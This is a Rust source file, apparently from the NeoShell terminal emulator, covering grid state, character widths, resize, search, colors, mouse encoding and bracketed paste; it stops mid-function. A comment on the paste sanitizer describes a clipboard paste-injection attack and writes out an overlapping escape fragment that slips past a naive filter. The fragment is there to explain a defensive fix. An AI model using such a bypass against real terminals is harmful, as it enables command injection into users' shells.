use crate::ui::theme_config::{self, AnsiPalette};
use std::collections::VecDeque;
use vte::{Parser, Perform};

#[derive(Clone, Copy, Debug, PartialEq)]
pub struct Color {
    pub r: u8,
    pub g: u8,
    pub b: u8,
}

impl Color {
    pub fn rgb(r: u8, g: u8, b: u8) -> Self {
        Self { r, g, b }
    }
}

pub const DEFAULT_FG: Color = Color {
    r: 226,
    g: 232,
    b: 240,
};
pub const DEFAULT_BG: Color = Color {
    r: 26,
    g: 27,
    b: 46,
};

/// Whether `c` is the default foreground — what a fresh cell, SGR 0 and SGR 39
/// leave behind. Renderers ask this instead of comparing RGB triples by hand,
/// so the sentinel lives in exactly one place.
#[inline]
pub fn is_default_fg(c: Color) -> bool {
    c == DEFAULT_FG
}

/// Whether `c` is the default background — what a fresh cell, SGR 0 and SGR 49
/// leave behind. See [`is_default_fg`].
#[inline]
pub fn is_default_bg(c: Color) -> bool {
    c == DEFAULT_BG
}

/// The shipped ANSI table. Grids paint with `TerminalGrid::palette` (which the
/// theme owns) rather than this; it stays as the reference that
/// `ThemeConfig::NEOSHELL.ansi` mirrors, and `theme_config`'s
/// `default_ansi_matches_the_terminal_renderer` test fails loudly if the two
/// ever drift. Only tests read it, so only test builds compile it.
#[cfg(test)]
pub const ANSI_COLORS: [Color; 16] = [
    Color {
        r: 26,
        g: 27,
        b: 46,
    }, // black
    Color {
        r: 239,
        g: 68,
        b: 68,
    }, // red
    Color {
        r: 34,
        g: 197,
        b: 94,
    }, // green
    Color {
        r: 245,
        g: 158,
        b: 11,
    }, // yellow
    Color {
        r: 99,
        g: 102,
        b: 241,
    }, // blue
    Color {
        r: 168,
        g: 85,
        b: 247,
    }, // magenta
    Color {
        r: 6,
        g: 182,
        b: 212,
    }, // cyan
    Color {
        r: 226,
        g: 232,
        b: 240,
    }, // white
    Color {
        r: 100,
        g: 116,
        b: 139,
    }, // bright black
    Color {
        r: 248,
        g: 113,
        b: 113,
    }, // bright red
    Color {
        r: 74,
        g: 222,
        b: 128,
    }, // bright green
    Color {
        r: 251,
        g: 191,
        b: 36,
    }, // bright yellow
    Color {
        r: 129,
        g: 140,
        b: 248,
    }, // bright blue
    Color {
        r: 192,
        g: 132,
        b: 252,
    }, // bright magenta
    Color {
        r: 34,
        g: 211,
        b: 238,
    }, // bright cyan
    Color {
        r: 248,
        g: 250,
        b: 252,
    }, // bright white
];

#[derive(Clone, Copy, Debug)]
pub struct CellStyle {
    pub fg: Color,
    pub bg: Color,
    pub bold: bool,
    pub italic: bool,
    pub underline: bool,
    pub inverse: bool,
}

impl Default for CellStyle {
    fn default() -> Self {
        CellStyle {
            fg: DEFAULT_FG,
            bg: DEFAULT_BG,
            bold: false,
            italic: false,
            underline: false,
            inverse: false,
        }
    }
}

#[derive(Clone, Debug)]
pub struct Cell {
    pub c: char,
    pub style: CellStyle,
    /// True if this is a wide (CJK) character occupying 2 columns.
    pub wide: bool,
    /// True if this cell is the right half of a wide character.
    pub wide_cont: bool,
}

impl Default for Cell {
    fn default() -> Self {
        Cell {
            c: ' ',
            style: CellStyle::default(),
            wide: false,
            wide_cont: false,
        }
    }
}

/// Check if a character is a wide (double-width) character (CJK, fullwidth, etc).
fn is_wide_char(c: char) -> bool {
    let cp = c as u32;
    // CJK Unified Ideographs
    (0x4E00..=0x9FFF).contains(&cp)
    // CJK Extension A
    || (0x3400..=0x4DBF).contains(&cp)
    // CJK Extension B+
    || (0x20000..=0x2FA1F).contains(&cp)
    // CJK Compatibility Ideographs
    || (0xF900..=0xFAFF).contains(&cp)
    // Hangul Jamo + Syllables
    || (0x1100..=0x115F).contains(&cp)
    || (0xAC00..=0xD7AF).contains(&cp)
    // Fullwidth Forms
    || (0xFF01..=0xFF60).contains(&cp)
    || (0xFFE0..=0xFFE6).contains(&cp)
    // CJK Symbols and Punctuation
    || (0x3000..=0x303F).contains(&cp)
    // Hiragana, Katakana
    || (0x3040..=0x30FF).contains(&cp)
    || (0x31F0..=0x31FF).contains(&cp)
    // Bopomofo
    || (0x3100..=0x312F).contains(&cp)
    // Enclosed CJK + CJK Compatibility Forms
    || (0x3200..=0x33FF).contains(&cp)
    || (0xFE30..=0xFE4F).contains(&cp)
    // CJK Radicals / Kangxi
    || (0x2E80..=0x2EFF).contains(&cp)
    || (0x2F00..=0x2FDF).contains(&cp)
    // Emoji & pictographs — most are wide-cell
    || (0x1F300..=0x1F64F).contains(&cp)
    || (0x1F680..=0x1F6FF).contains(&cp)
    || (0x1F900..=0x1F9FF).contains(&cp)
    || (0x1FA00..=0x1FAFF).contains(&cp)
}

/// Check if a character takes zero cells (combining marks, ZWJ, variation
/// selectors). TUI programs like `top`/`nmon`/`htop` emit these; without this
/// check each one would advance the cursor by 1 and shift the entire row.
fn is_zero_width_char(c: char) -> bool {
    let cp = c as u32;
    // Combining diacritical marks + extensions
    (0x0300..=0x036F).contains(&cp)
    || (0x1AB0..=0x1AFF).contains(&cp)
    || (0x1DC0..=0x1DFF).contains(&cp)
    || (0x20D0..=0x20FF).contains(&cp)
    || (0xFE20..=0xFE2F).contains(&cp)
    // Zero-width joiner / non-joiner / space
    || cp == 0x200B || cp == 0x200C || cp == 0x200D
    // Variation selectors (VS1-16, VS17-256)
    || (0xFE00..=0xFE0F).contains(&cp)
    || (0xE0100..=0xE01EF).contains(&cp)
    // Mongolian free variation selectors
    || (0x180B..=0x180D).contains(&cp)
    // Bidi / directional marks
    || cp == 0x200E || cp == 0x200F
    || (0x202A..=0x202E).contains(&cp)
    || (0x2066..=0x2069).contains(&cp)
    // BOM
    || cp == 0xFEFF
}

/// Columns `c` takes, by the rule `print` places cells with: 0 for a
/// zero-width mark, 2 for a wide (CJK, fullwidth, emoji) character, 1 for
/// anything else.
fn char_width(c: char) -> usize {
    if is_zero_width_char(c) {
        0
    } else if is_wide_char(c) {
        2
    } else {
        1
    }
}

/// How many columns `s` takes, counted the way the grid lays out cells: a CJK
/// character is two, a combining mark or other zero-width character none.
/// Size names and titles for a fixed-width slot with this, not
/// `chars().count()`, which makes a Chinese name look half as wide as it is.
pub fn display_width(s: &str) -> usize {
    s.chars().map(char_width).sum()
}

/// `s` cut down to at most `max_cols` columns (see [`display_width`]), ending
/// in `…` when anything was cut. The ellipsis counts against the budget, a
/// character is never split, a wide character that would straddle the edge is
/// dropped whole, and a combining mark stays or goes with its base — so the
/// result is never wider than `max_cols`. A string that fits comes back as is.
pub fn truncate_to_width(s: &str, max_cols: usize) -> String {
    const ELLIPSIS: char = '…';
    if display_width(s) <= max_cols {
        return s.to_string();
    }
    // Too narrow for even the ellipsis.
    let Some(budget) = max_cols.checked_sub(char_width(ELLIPSIS)) else {
        return String::new();
    };
    let mut out = String::new();
    let mut used = 0;
    for c in s.chars() {
        let w = char_width(c);
        if used + w > budget {
            break;
        }
        used += w;
        out.push(c);
    }
    out.push(ELLIPSIS);
    out
}

/// One ANSI slot (0-15) from a theme palette, as a terminal `Color`.
/// Out-of-range indices saturate at 15, matching `ThemeConfig::ansi_color`.
fn palette_color(palette: &AnsiPalette, idx: usize) -> Color {
    let c = palette[idx.min(15)];
    Color::rgb(c.r, c.g, c.b)
}

/// Convert a 256-color index to an RGB Color.
///
/// The first 16 entries come from the themeable ANSI table — the same one SGR
/// 30-37 / 90-97 resolve through — so `ESC[38;5;1m` and `ESC[31m` always agree.
/// The 216-color cube and the grayscale ramp are fixed by the standard.
fn color_256(idx: u16, palette: &AnsiPalette) -> Color {
    if idx < 16 {
        palette_color(palette, idx as usize)
    } else if idx < 232 {
        let idx = idx - 16;
        let r = (idx / 36) as u8;
        let g = ((idx % 36) / 6) as u8;
        let b = (idx % 6) as u8;
        Color::rgb(
            if r > 0 { 55 + r * 40 } else { 0 },
            if g > 0 { 55 + g * 40 } else { 0 },
            if b > 0 { 55 + b * 40 } else { 0 },
        )
    } else {
        let gray = 8 + (idx - 232) as u8 * 10;
        Color::rgb(gray, gray, gray)
    }
}

/// Maximum number of scrollback lines retained per terminal.
const MAX_SCROLLBACK: usize = 10_000;

/// Upper bound on either grid dimension. Roughly four orders of magnitude
/// above any real terminal, but small enough that a bogus request (a corrupt
/// SIGWINCH, or a cell width of 0 saturating a float->usize cast to
/// `usize::MAX`) clamps instead of trying to allocate.
const MAX_DIMENSION: usize = 1000;

/// The raw terminal grid state. Implements vte::Perform so the parser can
/// drive cursor movement, character placement, and escape-sequence handling.
pub struct TerminalGrid {
    pub cols: usize,
    pub rows: usize,
    pub cells: Vec<Vec<Cell>>,
    pub scrollback: VecDeque<Vec<Cell>>,
    pub scroll_offset: usize,
    pub cursor_x: usize,
    pub cursor_y: usize,
    pub cursor_visible: bool,
    pub generation: u64,
    style: CellStyle,
    saved_cursor: Option<(usize, usize)>,
    scroll_top: usize,
    scroll_bottom: usize,
    alt_screen: Option<Vec<Vec<Cell>>>,
    /// Persistent VTE parser — survives across write() calls so multi-byte
    /// UTF-8 sequences split across SSH packets are handled correctly.
    persistent_parser: Option<Parser>,
    /// DEC 2004. While set, pasted text goes out fenced in `ESC[200~`/`ESC[201~`
    /// so the remote shell treats a newline in the clipboard as text, not Enter.
    bracketed_paste: bool,
    /// DEC 1000 / 1002 / 1003 are independent switches, and the effective
    /// report level is the most capable one still set — so they are tracked
    /// separately instead of collapsed into one value. Otherwise tmux's
    /// teardown (`ESC[?1003l` while 1002 is still on) would silence the mouse
    /// a beat early.
    mouse_click: bool,
    mouse_drag: bool,
    mouse_motion: bool,
    /// DEC 1005 / 1006 / 1015 — the wire form mouse reports take.
    mouse_encoding: MouseEncoding,
    /// The 16 SGR colors this grid paints with. Seeded from the live theme at
    /// construction; `set_palette` pushes later edits into an open session.
    palette: AnsiPalette,
}

impl TerminalGrid {
    pub fn new(cols: usize, rows: usize) -> Self {
        let cells = vec![vec![Cell::default(); cols]; rows];
        Self {
            cols,
            rows,
            cells,
            scrollback: VecDeque::with_capacity(MAX_SCROLLBACK),
            scroll_offset: 0,
            cursor_x: 0,
            cursor_y: 0,
            cursor_visible: true,
            generation: 0,
            style: CellStyle::default(),
            saved_cursor: None,
            scroll_top: 0,
            scroll_bottom: rows.saturating_sub(1),
            alt_screen: None,
            persistent_parser: Some(Parser::new()),
            bracketed_paste: false,
            mouse_click: false,
            mouse_drag: false,
            mouse_motion: false,
            mouse_encoding: MouseEncoding::X10,
            palette: theme_config::live().ansi,
        }
    }

    /// Feed raw bytes through the persistent parser.
    /// The parser is kept across calls so multi-byte UTF-8 sequences
    /// split across SSH data packets are decoded correctly.
    pub fn write(&mut self, data: &[u8]) {
        let mut parser = self.persistent_parser.take().unwrap_or_else(Parser::new);
        for &byte in data {
            parser.advance(self, byte);
        }
        self.persistent_parser = Some(parser);
        self.generation = self.generation.wrapping_add(1);
    }

    #[doc(hidden)]
    fn _clip_or_pad_helper(row: Vec<Cell>, new_cols: usize) -> Vec<Cell> {
        let mut out = row;
        if out.len() > new_cols {
            out.truncate(new_cols);
        } else if out.len() < new_cols {
            out.resize(new_cols, Cell::default());
        }
        out
    }

    /// Resize the terminal grid, preserving content where possible.
    ///
    /// When shrinking rows, keep the **row containing the cursor** visible
    /// (plus some history above it) and push the rest of the top rows into
    /// scrollback — otherwise a window resize eats the active shell prompt.
    /// When growing rows, pull from scrollback to fill the new top rows so
    /// resize doesn't flash blank lines.
    pub fn resize(&mut self, new_cols: usize, new_rows: usize) {
        if new_cols == 0 || new_rows == 0 {
            return;
        }
        // Defence in depth: callers derive these from pixel bounds divided by
        // a cell size, and a zero cell size saturates the float->usize cast to
        // usize::MAX. Clamp rather than attempt the allocation.
        let new_cols = new_cols.min(MAX_DIMENSION);
        let new_rows = new_rows.min(MAX_DIMENSION);

        let old_rows = self.cells.len();
        let cursor_y = self.cursor_y;

        // --- Shrink rows: drop enough TOP rows to keep cursor inside the
        // new window (cursor goes to bottom when it was near the bottom).
        if old_rows > new_rows {
            let drop_top = if cursor_y + 1 > new_rows {
                (cursor_y + 1 - new_rows).min(old_rows - new_rows)
            } else {
                0
            };
            for row in self.cells.drain(0..drop_top) {
                self.scrollback.push_back(row);
            }
            while self.scrollback.len() > MAX_SCROLLBACK {
                self.scrollback.pop_front();
            }
            self.cells.truncate(new_rows);
            self.cursor_y = cursor_y.saturating_sub(drop_top);
        }

        // --- Build new row buffer. If growing, pull from scrollback into
        // the top so users don't see blank rows flash in.
        let mut new_cells: Vec<Vec<Cell>> = Vec::with_capacity(new_rows);

        if self.cells.len() < new_rows {
            let need = new_rows - self.cells.len();
            let from_scrollback = need.min(self.scrollback.len());
            for _ in 0..from_scrollback {
                if let Some(row) = self.scrollback.pop_back() {
                    new_cells.push(Self::_clip_or_pad_helper(row, new_cols));
                }
            }
            new_cells.reverse();
            for _ in from_scrollback..need {
                new_cells.push(vec![Cell::default(); new_cols]);
            }
            self.cursor_y = self.cursor_y.saturating_add(from_scrollback);
        }

        for row in self.cells.drain(..) {
            new_cells.push(Self::_clip_or_pad_helper(row, new_cols));
        }

        // Ensure exact length
        new_cells.truncate(new_rows);
        while new_cells.len() < new_rows {
            new_cells.push(vec![Cell::default(); new_cols]);
        }

        self.cells = new_cells;
        self.cols = new_cols;
        self.rows = new_rows;
        self.scroll_bottom = new_rows.saturating_sub(1);
        if self.cursor_x >= new_cols {
            self.cursor_x = new_cols - 1;
        }
        if self.cursor_y >= new_rows {
            self.cursor_y = new_rows - 1;
        }

        // Keep the saved (primary) screen in step with the live grid. Without
        // this, enter-alt -> resize -> exit-alt restores a buffer whose
        // dimensions no longer match rows/cols, and the next erase or scroll
        // indexes past the end of `cells`.
        if let Some(alt) = self.alt_screen.take() {
            let mut fixed: Vec<Vec<Cell>> = alt
                .into_iter()
                .map(|row| Self::_clip_or_pad_helper(row, new_cols))
                .collect();
            // Drop from the TOP when shrinking, matching what resize() does to
            // the live grid, so the most recent lines survive.
            if fixed.len() > new_rows {
                fixed.drain(0..fixed.len() - new_rows);
            }
            while fixed.len() < new_rows {
                fixed.push(vec![Cell::default(); new_cols]);
            }
            self.alt_screen = Some(fixed);
        }

        self.generation = self.generation.wrapping_add(1);
    }

    /// Scroll the visible region up by one line.
    fn scroll_up(&mut self) {
        if self.scroll_top == 0 {
            self.scrollback.push_back(self.cells[0].clone());
            if self.scrollback.len() > MAX_SCROLLBACK {
                self.scrollback.pop_front();
            }
        }
        for y in self.scroll_top..self.scroll_bottom {
            self.cells[y] = self.cells[y + 1].clone();
        }
        self.cells[self.scroll_bottom] = vec![Cell::default(); self.cols];
    }

    /// Scroll the visible region down by one line.
    fn scroll_down(&mut self) {
        for y in (self.scroll_top + 1..=self.scroll_bottom).rev() {
            self.cells[y] = self.cells[y - 1].clone();
        }
        self.cells[self.scroll_top] = vec![Cell::default(); self.cols];
    }

    /// Get a renderable line (scrollback-aware).
    ///
    /// When `scroll_offset > 0`, the viewport is shifted upward into the
    /// scrollback buffer.  `visual_y == 0` is the topmost visible row.
    pub fn get_visible_line(&self, visual_y: usize) -> &[Cell] {
        if self.scroll_offset > 0 {
            let sb_len = self.scrollback.len();
            // The first visible line starts this many entries from the end of
            // the scrollback buffer.
            let start = sb_len.saturating_sub(self.scroll_offset);
            let line_idx = start + visual_y;
            if line_idx < sb_len {
                return &self.scrollback[line_idx];
            }
            let grid_y = line_idx - sb_len;
            if grid_y < self.rows {
                return &self.cells[grid_y];
            }
        }
        &self.cells[visual_y]
    }

    pub fn scroll_view_up(&mut self, lines: usize) {
        let max = self.scrollback.len();
        self.scroll_offset = (self.scroll_offset + lines).min(max);
        self.generation = self.generation.wrapping_add(1);
    }

    pub fn scroll_view_down(&mut self, lines: usize) {
        self.scroll_offset = self.scroll_offset.saturating_sub(lines);
        self.generation = self.generation.wrapping_add(1);
    }

    /// Find all occurrences of `query` in scrollback + visible grid.
    /// `abs_line` indices: 0..scrollback.len() for history, then grid rows after.
    pub fn search(&self, query: &str, case_insensitive: bool) -> Vec<SearchMatch> {
        if query.is_empty() { return Vec::new(); }
        let needle: String = if case_insensitive { query.to_lowercase() } else { query.to_string() };
        let mut out = Vec::new();
        for (i, row) in self.scrollback.iter().enumerate() {
            append_row_matches(row, &needle, case_insensitive, i, &mut out);
        }
        let sb_len = self.scrollback.len();
        for (gy, row) in self.cells.iter().enumerate() {
            append_row_matches(row, &needle, case_insensitive, sb_len + gy, &mut out);
        }
        out
    }
}

/// A search hit in the terminal buffer. Coordinates are in absolute-line space
/// (scrollback rows first, grid rows after). `col_end` is exclusive.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SearchMatch {
    pub abs_line: usize,
    pub col_start: usize,
    pub col_end: usize,
}

fn append_row_matches(
    row: &[Cell],
    needle: &str,
    case_insensitive: bool,
    abs_line: usize,
    out: &mut Vec<SearchMatch>,
) {
    // Build the row as a String and remember which column each byte of the
    // string came from, so we can translate byte offsets back to columns.
    let mut buf = String::with_capacity(row.len());
    let mut col_for_byte: Vec<usize> = Vec::with_capacity(row.len() * 2);
    for (col, cell) in row.iter().enumerate() {
        let ch = if cell.c == '\0' { ' ' } else { cell.c };
        if case_insensitive {
            for lo in ch.to_lowercase() {
                let s_len = lo.len_utf8();
                for _ in 0..s_len { col_for_byte.push(col); }
                buf.push(lo);
            }
        } else {
            let s_len = ch.len_utf8();
            for _ in 0..s_len { col_for_byte.push(col); }
            buf.push(ch);
        }
    }
    for (byte_idx, _) in buf.match_indices(needle) {
        let col_start = col_for_byte.get(byte_idx).copied().unwrap_or(0);
        let end_byte = byte_idx + needle.len();
        // Column of the last byte belonging to the match, then +1 for exclusive end.
        let col_end = col_for_byte
            .get(end_byte.saturating_sub(1))
            .copied()
            .map(|c| c + 1)
            .unwrap_or_else(|| col_for_byte.last().copied().map(|c| c + 1).unwrap_or(col_start));
        out.push(SearchMatch { abs_line, col_start, col_end });
    }
}

// ---------------------------------------------------------------------------
// Paste, mouse reporting, and palette
//
// The state a host application switches on with DEC private modes, plus the
// encoders that turn NeoShell's own input events back into the wire forms
// those modes imply. `app.rs` decides *when* an event happens; this module
// owns *what goes on the wire*.
// ---------------------------------------------------------------------------

/// Bracketed-paste opening marker (DEC 2004).
pub const PASTE_START: &[u8] = b"\x1b[200~";
/// Bracketed-paste closing marker (DEC 2004).
pub const PASTE_END: &[u8] = b"\x1b[201~";

/// Largest coordinate the legacy X10 mouse encoding can carry: each coordinate
/// travels as `32 + value` in a single byte, so 223 saturates it at 255.
const X10_MAX_COORD: usize = 223;

/// Largest coordinate DEC 1005 can carry: `32 + value` travels as a UTF-8 code
/// point of at most two bytes, so 2015 saturates it at U+07FF (xterm's limit).
const UTF8_MAX_COORD: usize = 2015;

/// Make a payload safe to send between `ESC[200~` and `ESC[201~`.
///
/// Every control character is dropped except TAB, LF and CR: all of C0 (ESC
/// included), DEL, and C1 (U+0080–U+009F, whose U+009B is the 8-bit CSI). That
/// is xterm's `allowPasteControls: false`. With no introducer left, no escape
/// sequence of any kind can exist in the output, so a crafted clipboard entry
/// cannot close the bracket itself and have its tail reach the remote shell as
/// typed input — a "click to copy" snippet that appends a command which runs
/// the instant the user pastes.
///
/// This used to cut out only the terminator, which is not enough: one pass
/// that removes `ESC[201~` from `ESC[20` + `ESC[201~` + `1~` joins the
/// leftovers into a fresh, live `ESC[201~`. Dropping the ESC byte itself
/// closes that whole class, overlapping or not. Printable text, non-ASCII
/// included, passes through untouched. (The name predates this rule; callers
/// keep it.)
pub fn strip_paste_terminator(payload: &str) -> String {
    payload
        .chars()
        .filter(|&c| matches!(c, '\t' | '\n' | '\r') || !c.is_control())
        .collect()
}

/// Encode a clipboard payload for the wire.
///
/// With bracketed paste active the payload is fenced in `ESC[200~`/`ESC[201~`
/// — which is what makes a shell treat a pasted newline as text instead of
/// Enter — once [`strip_paste_terminator`] has removed every control that
/// could end the fence early. Without it the payload goes out byte-for-byte,
/// exactly as NeoShell sent it before.
pub fn encode_paste(payload: &str, bracketed: bool) -> Vec<u8> {
    if !bracketed {
        return payload.as_bytes().to_vec();
    }
    let body = strip_paste_terminator(payload);
    let mut out = Vec::with_capacity(body.len() + PASTE_START.len() + PASTE_END.len());
    out.extend_from_slice(PASTE_START);
    out.extend_from_slice(body.as_bytes());
    out.extend_from_slice(PASTE_END);
    out
}

/// How much mouse activity the remote application asked to hear about.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub enum MouseMode {
    /// Nothing is reported — clicks belong to NeoShell (text selection).
    #[default]
    Off,
    /// DEC 1000: press and release.
    Click,
    /// DEC 1002: press, release, and motion while a button is held.
    Drag,
    /// DEC 1003: every motion, button held or not.
    Motion,
}

/// How a mouse report is laid out on the wire. The DEC modes selecting one are
/// mutually exclusive: the last one set wins.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum MouseEncoding {
    /// The legacy form: `ESC [ M` and three bytes of `32 + value`; coordinates
    /// saturate at 223.
    X10,
    /// DEC 1005: the X10 layout, with each `32 + value` sent as a UTF-8 code
    /// point, so columns past 95 take two bytes; coordinates saturate at 2015.
    Utf8,
    /// DEC 1006: `ESC [ < b ; x ; y` in decimal, then `M` for a press and `m`
    /// for a release.
    Sgr,
    /// DEC 1015 (urxvt): `ESC [ 32+b ; x ; y M` in decimal.
    Urxvt,
}

/// The buttons NeoShell can report. The wheel follows xterm: a notch is a
/// press with no matching release.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum MouseButton {
    Left,
    Middle,
    Right,
    WheelUp,
    WheelDown,
}

impl MouseButton {
    /// The xterm button number that goes into Cb.
    fn code(self) -> u32 {
        match self {
            MouseButton::Left => 0,
            MouseButton::Middle => 1,
            MouseButton::Right => 2,
            MouseButton::WheelUp => 64,
            MouseButton::WheelDown => 65,
        }
    }

    fn is_wheel(self) -> bool {
        matches!(self, MouseButton::WheelUp | MouseButton::WheelDown)
    }
}

impl TerminalGrid {
    /// Whether the application turned on bracketed paste (DEC 2004).
    pub fn bracketed_paste(&self) -> bool {
        self.bracketed_paste
    }

    /// The most capable mouse reporting level currently switched on.
    pub fn mouse_mode(&self) -> MouseMode {
        if self.mouse_motion {
            MouseMode::Motion
        } else if self.mouse_drag {
            MouseMode::Drag
        } else if self.mouse_click {
            MouseMode::Click
        } else {
            MouseMode::Off
        }
    }

    /// Give this grid a different ANSI palette.
    ///
    /// New grids already pick up the live theme; this is how a theme edit
    /// reaches a session that is already open. Cells resolve their color when
    /// they are printed, so the new table applies to output from here on —
    /// text already on screen keeps the colors it was drawn with.
    pub fn set_palette(&mut self, palette: AnsiPalette) {
        self.palette = palette;
        self.generation = self.generation.wrapping_add(1);
    }

    /// Encode a button press or release. `col` and `row` are 1-based cell
    /// coordinates.
    ///
    /// Returns `None` when the application has not asked for mouse reports —
    /// so the caller falls back to NeoShell's own selection handling — and for
    /// a wheel release, which xterm does not report at all.
    pub fn encode_mouse(
        &self,
        button: MouseButton,
        col: usize,
        row: usize,
        pressed: bool,
    ) -> Option<Vec<u8>> {
        if self.mouse_mode() == MouseMode::Off {
            return None;
        }
        if button.is_wheel() {
            return pressed.then(|| self.encode_mouse_bytes(button.code(), col, row, false));
        }
        Some(self.encode_mouse_bytes(button.code(), col, row, !pressed))
    }

    /// Encode pointer motion. `held` is the button still down, or `None` for a
    /// bare move.
    ///
    /// Returns `None` unless the application asked for motion: DEC 1002 reports
    /// only while a button is held, DEC 1003 reports everything.
    pub fn encode_mouse_motion(
        &self,
        held: Option<MouseButton>,
        col: usize,
        row: usize,
    ) -> Option<Vec<u8>> {
        let wanted = match self.mouse_mode() {
            MouseMode::Motion => true,
            MouseMode::Drag => held.is_some(),
            MouseMode::Click | MouseMode::Off => false,
        };
        if !wanted {
            return None;
        }
        // Cb carries the held button (3 = none) plus the motion bit.
        let base = held
            .filter(|b| !b.is_wheel())
            .map(MouseButton::code)
            .unwrap_or(3);
        Some(self.encode_mouse_bytes(base + 32, col, row, false))
    }

    /// The four wire forms. SGR (DEC 1006) keeps the button number on release
    /// and flips the final byte to `m`; the other three report button 3 for
    /// any release. X10 cannot express a coordinate past 223 and UTF-8 (DEC
    /// 1005) none past 2015, so both clamp; SGR and urxvt (DEC 1015) are
    /// decimal and unbounded.
    fn encode_mouse_bytes(&self, cb: u32, col: usize, row: usize, release: bool) -> Vec<u8> {
        let (col, row) = (col.max(1), row.max(1));
        // Every form but SGR loses the button on release.
        let legacy_cb = if release { 3 } else { cb as usize };
        match self.mouse_encoding {
            MouseEncoding::X10 => {
                let mut out = Vec::with_capacity(6);
                out.extend_from_slice(b"\x1b[M");
                for value in [legacy_cb, col, row] {
                    out.push((32 + value.min(X10_MAX_COORD)) as u8);
                }
                out
            }
            MouseEncoding::Utf8 => {
                let mut out = String::from("\x1b[M");
                for value in [legacy_cb, col, row] {
                    // At most U+07FF, so always a scalar value, never a surrogate.
                    out.extend(char::from_u32(32 + value.min(UTF8_MAX_COORD) as u32));
                }
                out.into_bytes()
            }
            MouseEncoding::Sgr => {
                let final_byte = if release { 'm' } else { 'M' };
                format!("\x1b[<{};{};{}{}", cb, col, row, final_byte).into_bytes()
            }
            MouseEncoding::Urxvt => {
                format!("\x1b[{};{};{}M", 32 + legacy_cb, col, row).into_bytes()
            }
        }
    }

    /// Set or reset one mouse coordinate encoding (DEC 1005 / 1006 / 1015).
    ///
    /// Setting one replaces whichever was in force. A reset, as in xterm, only
    /// takes effect against the encoding it names: `ESC[?1006h ESC[?1015l`
    /// leaves SGR selected, instead of dropping to X10 while the application
    /// goes on parsing SGR.
    fn set_mouse_encoding(&mut self, named: MouseEncoding, on: bool) {
        if on {
            self.mouse_encoding = named;
        } else if self.mouse_encoding == named {
            self.mouse_encoding = MouseEncoding::X10;
        }
    }

    /// Apply one DEC private mode (`ESC[?<n>h` / `ESC[?<n>l`).
    fn set_dec_mode(&mut self, mode: u16, on: bool) {
        match mode {
            25 => self.cursor_visible = on,
            1049 | 47 | 1047 => {
                if on {
                    // Switch to alternate screen buffer
                    self.alt_screen = Some(self.cells.clone());
                    self.cells = vec![vec![Cell::default(); self.cols]; self.rows];
                    self.cursor_x = 0;
                    self.cursor_y = 0;
                } else if let Some(cells) = self.alt_screen.take() {
                    // Switch back from alternate screen buffer
                    self.cells = cells;
                }
            }
            // Mouse tracking levels.
            1000 => self.mouse_click = on,
            1002 => self.mouse_drag = on,
            1003 => self.mouse_motion = on,
            // Coordinate encodings.
            1005 => self.set_mouse_encoding(MouseEncoding::Utf8, on),
            1006 => self.set_mouse_encoding(MouseEncoding::Sgr, on),
            1015 => self.set_mouse_encoding(MouseEncoding::Urxvt, on),
            2004 => self.bracketed_paste = on,
            _ => {}
        }
    }
}

impl TerminalGrid {
    /// Handle SGR (Select Graphic Rendition) escape parameters.
    fn handle_sgr(&mut self, params: &vte::Params) {
        let params: Vec<u16> = params.iter().flat_map(|sub| sub.iter().copied()).collect();

        if params.is_empty() {
            self.style = CellStyle::default();
            return;
        }

        // One copy per escape sequence rather than one lookup per color.
        let palette = self.palette;
        let mut i = 0;
        while i < params.len() {
            match params[i] {
                0 => self.style = CellStyle::default(),
                1 => self.style.bold = true,
                3 => self.style.italic = true,
                4 => self.style.underline = true,
                7 => self.style.inverse = true,
                22 => self.style.bold = false,
                23 => self.style.italic = false,
                24 => self.style.underline = false,
                27 => self.style.inverse = false,
                // Standard foreground colors 30-37
                30..=37 => self.style.fg = palette_color(&palette, (params[i] - 30) as usize),
                39 => self.style.fg = DEFAULT_FG,
                // Standard background colors 40-47
                40..=47 => self.style.bg = palette_color(&palette, (params[i] - 40) as usize),
                49 => self.style.bg = DEFAULT_BG,
                // Bright foreground 90-97
                90..=97 => self.style.fg = palette_color(&palette, (params[i] - 90 + 8) as usize),
                // Bright background 100-107
                100..=107 => self.style.bg = palette_color(&palette, (params[i] - 100 + 8) as usize),
                // Extended foreground color
                38 => {
                    if i + 1 < params.len() {
                        match params[i + 1] {
                            5 => {
                                // 256-color mode
                                if i + 2 < params.len() {
                                    self.style.fg = color_256(params[i + 2], &palette);
                                    i += 2;
                                }
                            }
                            2 => {
                                // Truecolor RGB
                                if i + 4 < params.len() {
                                    self.style.fg = Color::rgb(
                                        params[i + 2] as u8,
                                        params[i + 3] as u8,
                                        params[i + 4] as u8,
                                    );
                                    i += 4;
                                }
                            }
                            _ => {}
                        }
                    }
                }
                // Extended background color
                48 => {
                    if i + 1 < params.len() {
                        match params[i + 1] {
                            5 => {
                                if i + 2 < params.len() {
                                    self.style.bg = color_256(params[i + 2], &palette);
                                    i += 2;
                                }
                            }
                            2 => {
                                if i + 4 < params.len() {
                                    self.style.bg = Color::rgb(
                                        params[i + 2] as u8,
                                        params[i + 3] as u8,
                                        params[i + 4] as u8,
                                    );
                                    i += 4;
                                }
                            }
                            _ => {}
                        }
                    }
                }
                _ => {}
            }
            i += 1;
        }
    }
}

// ---------------------------------------------------------------------------
// vte::Perform implementation for TerminalGrid
// ---------------------------------------------------------------------------

impl Perform for TerminalGrid {
    fn print(&mut self, c: char) {
        // Zero-width characters (combining marks, ZWJ, variation selectors):
        // do not advance the cursor, do not overwrite the current cell.
        // Without this, TUI programs (top/htop/nmon) drift 1 cell per mark.
        if is_zero_width_char(c) {
            return;
        }

        let wide = is_wide_char(c);
        let char_width = if wide { 2 } else { 1 };

        // Wrap if character won't fit on current line
        if self.cursor_x + char_width > self.cols {
            self.cursor_x = 0;
            self.cursor_y += 1;
            if self.cursor_y > self.scroll_bottom {
                self.cursor_y = self.scroll_bottom;
                self.scroll_up();
            }
        }

        if self.cursor_y < self.rows && self.cursor_x < self.cols {
            self.cells[self.cursor_y][self.cursor_x] = Cell {
                c,
                style: self.style,
                wide,
                wide_cont: false,
            };

            // For wide chars, mark the next cell as continuation
            if wide && self.cursor_x + 1 < self.cols {
                self.cells[self.cursor_y][self.cursor_x + 1] = Cell {
                    c: ' ',
                    style: self.style,
                    wide: false,
